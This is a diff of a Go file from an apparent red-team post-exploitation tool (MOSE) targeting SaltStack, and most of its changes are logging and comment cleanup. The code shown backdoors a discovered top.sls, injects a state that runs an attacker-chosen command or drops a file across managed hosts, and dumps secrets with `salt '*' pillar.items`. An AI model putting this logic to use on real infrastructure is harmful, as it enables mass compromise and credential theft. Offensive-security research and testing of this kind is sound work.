@@ -1,3 +1,7 @@
+// Copyright 2020 National Technology & Engineering Solutions of Sandia, LLC (NTESS).
+// Under the terms of Contract DE-NA0003525 with NTESS,
+// the U.S. Government retains certain rights in this software.
+
 package main
 
 import (
@@ -10,7 +14,6 @@ import (
 	"text/template"
 
 	"github.com/CrimsonK1ng/mose/pkg/moseutils"
-	"github.com/fatih/color"
 	"github.com/ghodss/yaml"
 	"github.com/gobuffalo/packr/v2"
 	utils "github.com/l50/goutils"
@@ -30,9 +33,7 @@ var (
 	a                = CreateAgent()
 	bdCmd            = a.Cmd
 	debug            = a.Debug
-	errmsg           = color.Red
 	localIP          = a.LocalIP
-	msg              = color.Green
 	osTarget         = a.OsTarget
 	saltState        = a.PayloadName
 	uploadFileName   = a.FileName
@@ -53,11 +54,10 @@ func init() {
 
 // backdoorTop backdoors the top.sls file found from searching the file system
 // topLoc is the filepath to the top.sls file on the system
-// This method will prompt the user for injection points into the top.sls
+// This function will prompt the user for injection points into the top.sls
 func backdoorTop(topLoc string) {
 	bytes, err := moseutils.ReadBytesFromFile(topLoc)
 	if err != nil {
-		log.Println(err)
 		log.Fatalf("Failed to backdoor the top.sls located at %s, exiting.", topLoc)
 	}
 
@@ -87,7 +87,7 @@ func backdoorTop(topLoc string) {
 	}
 
 	validIndex := make(map[int]bool, 0)
-	log.Println("Specific injection method requested, displaying indices to select")
+	moseutils.Msg("Specific injection method requested, displaying indices to select")
 	for k, v := range mapOfInjects {
 		ind := 0
 		for k1 := range v {
@@ -134,7 +134,7 @@ func injectYaml(unmarshalled map[string]interface{}, injectAll bool, addAllIfNon
 		injectPointsCreate = make(map[string]map[string]bool)
 	}
 
-	for k, v := range unmarshalled { //k is the fileroot if file_roots is not in the file
+	for k, v := range unmarshalled { // k is the fileroot if file_roots is not in the file
 		if k == "file_roots" { // There are two general cases for the top.sls. You can have a root element file_roots (optional)
 			for fileroot, frv := range v.(map[string]interface{}) { // unpack the fileroot such as base: interface{}
 				isAllFound := false
@@ -188,7 +188,7 @@ func injectYaml(unmarshalled map[string]interface{}, injectAll bool, addAllIfNon
 	return unmarshalled, injectPointsCreate
 }
 
-// createState Creates the state that we provided during mose buidl
+// createState creates the state that we provided during mose buidl
 // topLoc is the full path to top.sls
 // cmd is the command string to run if uploadFileName is not provided to agent.go
 func createState(topLoc string, cmd string) {
@@ -207,12 +207,12 @@ func createState(topLoc string, cmd string) {
 			saltFileFolders := filepath.Join(stateFolderLoc, "files")
 
 			moseutils.CreateFolders([]string{saltFileFolders})
-			log.Printf("Copying  %s to module location %s", uploadFileName, saltFileFolders)
+			moseutils.Info("Copying  %s to module location %s", uploadFileName, saltFileFolders)
 			moseutils.CpFile(uploadFileName, filepath.Join(saltFileFolders, filepath.Base(uploadFileName)))
 			if err := os.Chmod(filepath.Join(saltFileFolders, filepath.Base(uploadFileName)), 0644); err != nil {
 				log.Fatal(err)
 			}
-			log.Printf("Successfully copied and chmod file %s", filepath.Join(saltFileFolders, filepath.Base(uploadFileName)))
+			moseutils.Msg("Successfully copied and chmod file %s", filepath.Join(saltFileFolders, filepath.Base(uploadFileName)))
 		}
 	} else {
 		log.Fatalf("Failed to create %s state", saltState)
@@ -279,7 +279,7 @@ func doCleanup(siteLoc string) {
 	path = path + ".bak.mose"
 
 	if !moseutils.FileExists(path) {
-		log.Printf("Backup file %s does not exist, skipping", path)
+		moseutils.Info("Backup file %s does not exist, skipping", path)
 	}
 	ans2 := false
 	if !ans {
@@ -305,7 +305,7 @@ func backupSite(siteLoc string) {
 		moseutils.CpFile(siteLoc, path+".bak.mose")
 		return
 	}
-	log.Printf("Backup of the top.sls (%v.bak.mose) already exists.", siteLoc)
+	moseutils.Info("Backup of the top.sls (%v.bak.mose) already exists.", siteLoc)
 	return
 }
 
@@ -344,10 +344,10 @@ func getIndexInjects(mapOfInjects map[string]map[string]bool, index int) (string
 // getPillarSecrets tries to print out the pillar.items
 // binLoc is the path to salt binary
 func getPillarSecrets(binLoc string) {
-	//Running command salt '*' pillar.items
+	// Running command salt '*' pillar.items
 	res, err := utils.RunCommand(binLoc, "*", "pillar.items")
 	if err != nil {
-		log.Printf("Error running command: %s '*' pillar.items", binLoc)
+		moseutils.ErrMsg("Error running command: %s '*' pillar.items", binLoc)
 		log.Fatal(err)
 	}
 	moseutils.Msg("%s", res)
@@ -355,8 +355,7 @@ func getPillarSecrets(binLoc string) {
 	return
 }
 
-func main() {
-	// parse args
+func main() { // parse args
 	flag.Parse()
 
 	// gonna assume not root then we screwed
@@ -388,6 +387,6 @@ func main() {
 	backdoorTop(topLoc)
 	createState(topLoc, bdCmd)
 
-	log.Println("Attempting to find secrets stored with salt Pillars")
+	moseutils.Info("Attempting to find secrets stored with salt Pillars")
 	getPillarSecrets(strings.TrimSpace(binLoc))
 }
